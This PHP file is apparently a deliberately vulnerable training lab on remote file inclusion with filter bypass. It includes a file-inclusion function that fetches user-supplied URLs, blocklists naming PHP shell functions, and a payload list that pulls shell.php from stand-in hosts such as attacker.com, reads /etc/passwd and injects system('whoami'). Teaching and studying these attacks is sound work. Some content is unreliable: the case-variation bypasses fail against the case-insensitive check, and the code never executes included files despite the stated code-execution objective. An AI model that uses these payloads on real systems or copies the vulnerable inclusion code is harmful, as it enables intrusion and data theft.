<?php
// Lab 2: RFI with Filter Bypass
// Vulnerability: RFI with security filters that can be bypassed

session_start();

$message = '';
$included_content = '';
$user_input = '';

// Simulate file inclusion with basic filters (vulnerable to bypass)
function include_file_with_filters($filename) {
    // Basic security filters (can be bypassed)
    $dangerous_protocols = ['http://', 'https://', 'ftp://', 'file://'];
    $dangerous_extensions = ['.php', '.phtml', '.php3', '.php4', '.php5', '.php7'];
    $dangerous_functions = ['system', 'exec', 'shell_exec', 'passthru', 'eval'];
    
    if (empty($filename)) {
        return "No file specified.";
    }
    
    // Basic filter check (can be bypassed)
    $is_dangerous = false;
    
    // Check for dangerous protocols
    foreach ($dangerous_protocols as $protocol) {
        if (stripos($filename, $protocol) !== false) {
            $is_dangerous = true;
            break;
        }
    }
    
    // Check for dangerous extensions
    foreach ($dangerous_extensions as $ext) {
        if (stripos($filename, $ext) !== false) {
            $is_dangerous = true;
            break;
        }
    }
    
    if ($is_dangerous) {
        return "⚠️ FILTERED: Dangerous file detected - " . htmlspecialchars($filename);
    }
    
    // Check if it's a remote URL
    if (filter_var($filename, FILTER_VALIDATE_URL)) {
        // Vulnerable: Direct inclusion of remote files
        $content = @file_get_contents($filename);
        if ($content !== false) {
            return $content;
        } else {
            return "Failed to include remote file: " . htmlspecialchars($filename);
        }
    }
    
    // Local file inclusion
    $local_path = "includes/" . basename($filename);
    if (file_exists($local_path)) {
        return file_get_contents($local_path);
    } else {
        return "Local file not found: " . htmlspecialchars($local_path);
    }
}

// Handle file inclusion
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['include_file'])) {
    $user_input = $_POST['filename'] ?? '';
    
    if ($user_input) {
        $included_content = include_file_with_filters($user_input);
        
        if (strpos($included_content, '⚠️ FILTERED') !== false) {
            $message = '<div class="alert alert-warning">File filtered! Try bypassing the filters.</div>';
        } elseif (strpos($included_content, 'Failed to include remote file') !== false) {
            $message = '<div class="alert alert-danger">Failed to include remote file!</div>';
        } elseif (strpos($included_content, 'Local file not found') !== false) {
            $message = '<div class="alert alert-warning">Local file not found!</div>';
        } else {
            $message = '<div class="alert alert-success">File included successfully!</div>';
        }
    }
}

// Create some sample local files for testing
if (!file_exists('includes')) {
    mkdir('includes', 0755, true);
}

// Create sample files
$sample_files = [
    'welcome.txt' => 'Welcome to our application!',
    'about.txt' => 'This is a sample about page.',
    'contact.txt' => 'Contact us at: contact@example.com',
    'config.txt' => 'Database configuration: localhost:3306'
];

foreach ($sample_files as $filename => $content) {
    $file_path = 'includes/' . $filename;
    if (!file_exists($file_path)) {
        file_put_contents($file_path, $content);
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 2: RFI with Filter Bypass - RFI Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .included-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .file-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .filter-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to RFI Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 2: RFI with Filter Bypass</h1>
            <p class="hero-subtitle">RFI with security filters that can be bypassed</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Medium</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates RFI vulnerabilities where basic security filters are implemented but can be bypassed using various techniques. The application filters dangerous protocols and extensions but doesn't prevent all attack vectors.</p>
            <p><strong>Objective:</strong> Bypass security filters to achieve remote file inclusion and code execution.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code with Filters
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Basic filters that can be bypassed
function include_file_with_filters($filename) {
    $dangerous_protocols = ['http://', 'https://', 'ftp://', 'file://'];
    $dangerous_extensions = ['.php', '.phtml', '.php3', '.php4', '.php5'];
    
    // Basic filter check (can be bypassed)
    $is_dangerous = false;
    
    foreach ($dangerous_protocols as $protocol) {
        if (stripos($filename, $protocol) !== false) {
            $is_dangerous = true;
            break;
        }
    }
    
    // Still vulnerable to bypass techniques
    if (!$is_dangerous) {
        $content = @file_get_contents($filename);
        return $content;
    }
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-shield-exclamation me-2"></i>Filtered File Inclusion
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="filter-info">
                            <h5>Active Filters</h5>
                            <p>The following are filtered:</p>
                            <ul>
                                <li><strong>Protocols:</strong> http://, https://, ftp://, file://</li>
                                <li><strong>Extensions:</strong> .php, .phtml, .php3, .php4, .php5</li>
                                <li><strong>Functions:</strong> system, exec, shell_exec, passthru, eval</li>
                            </ul>
                        </div>
                        
                        <div class="file-info">
                            <h5>Available Local Files</h5>
                            <ul>
                                <li><code>welcome.txt</code> - Welcome message</li>
                                <li><code>about.txt</code> - About page</li>
                                <li><code>contact.txt</code> - Contact information</li>
                                <li><code>config.txt</code> - Configuration file</li>
                            </ul>
                        </div>
                        
                        <form method="POST">
                            <input type="hidden" name="include_file" value="1">
                            <div class="mb-3">
                                <label for="filename" class="form-label">File to Include</label>
                                <input type="text" class="form-control" id="filename" name="filename" 
                                       placeholder="Enter filename or URL..." value="<?php echo htmlspecialchars($user_input); ?>">
                            </div>
                            <button type="submit" class="btn btn-primary">Include File</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <?php if ($included_content): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-file-earmark me-2"></i>Included Content
                    </div>
                    <div class="card-body">
                        <div class="included-display">
                            <h5>File Content</h5>
                            <div class="sensitive-data">
                                <pre><?php echo htmlspecialchars($included_content); ?></pre>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> RFI with Filter Bypass</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Inadequate security filters</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Bypass Techniques</h5>
                    <ul>
                        <li><strong>Case Variation:</strong> Use different cases</li>
                        <li><strong>Encoding:</strong> Use encoded characters</li>
                        <li><strong>Alternative Protocols:</strong> Use unfiltered protocols</li>
                        <li><strong>String Manipulation:</strong> Build URLs dynamically</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>RFI Filter Bypass Payloads</h5>
            <p>Use these payloads to bypass the security filters:</p>
            
            <h6>1. Case Variation Bypass:</h6>
            <div class="code-block">HTTP://attacker.com/shell.php
HTTPS://evil.com/malicious.txt
FTP://attacker.com/shell.php
FILE:///etc/passwd</div>

            <h6>2. Encoding Bypass:</h6>
            <div class="code-block">%68%74%74%70://attacker.com/shell.php
%68%74%74%70%73://evil.com/malicious.txt
%66%74%70://attacker.com/shell.php
%66%69%6c%65:///etc/passwd</div>

            <h6>3. Alternative Protocols:</h6>
            <div class="code-block">gopher://attacker.com/shell.php
ldap://attacker.com/shell.php
dict://attacker.com/shell.php
sftp://attacker.com/shell.php</div>

            <h6>4. String Concatenation Bypass:</h6>
            <div class="code-block">ht' . 'tp://attacker.com/shell.php
ht' . 'tps://evil.com/malicious.txt
ft' . 'p://attacker.com/shell.php
fi' . 'le:///etc/passwd</div>

            <h6>5. Null Byte Bypass:</h6>
            <div class="code-block">http://attacker.com/shell.php%00
https://evil.com/malicious.txt%00
ftp://attacker.com/shell.php%00
file:///etc/passwd%00</div>

            <h6>6. Double Encoding Bypass:</h6>
            <div class="code-block">%2568%2574%2574%2570://attacker.com/shell.php
%2568%2574%2574%2570%2573://evil.com/malicious.txt
%2566%2574%2570://attacker.com/shell.php
%2566%2569%256c%2565:///etc/passwd</div>

            <h6>7. Alternative Extensions:</h6>
            <div class="code-block">http://attacker.com/shell.phtml
https://evil.com/malicious.php3
ftp://attacker.com/shell.php4
http://attacker.com/shell.php5</div>

            <h6>8. Data URI Bypass:</h6>
            <div class="code-block">data:text/plain,<?php echo "Hacked!"; ?>
data:text/plain,<?php system('whoami'); ?>
data:text/plain,<?php phpinfo(); ?></div>

            <h6>9. PHP Wrapper Bypass:</h6>
            <div class="code-block">php://input
php://filter/read=convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/read=convert.quoted-printable-encode/resource=index.php</div>

            <h6>10. Advanced Bypass Techniques:</h6>
            <div class="code-block">http://attacker.com/shell.php?
https://evil.com/malicious.txt#
ftp://attacker.com/shell.php&
http://attacker.com/shell.php|
https://evil.com/malicious.txt;
ftp://attacker.com/shell.php`</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Bypass WAFs and security filters</li>
                <li>Include remote malicious files despite protections</li>
                <li>Access sensitive local files using alternative methods</li>
                <li>Bypass authentication and authorization</li>
                <li>Compromise server and lateral movement</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement comprehensive input validation and sanitization</li>
                    <li>Use whitelist-based filtering instead of blacklists</li>
                    <li>Disable remote file inclusion in PHP configuration</li>
                    <li>Implement proper access controls and permissions</li>
                    <li>Use safe file inclusion functions and methods</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual file inclusion patterns</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
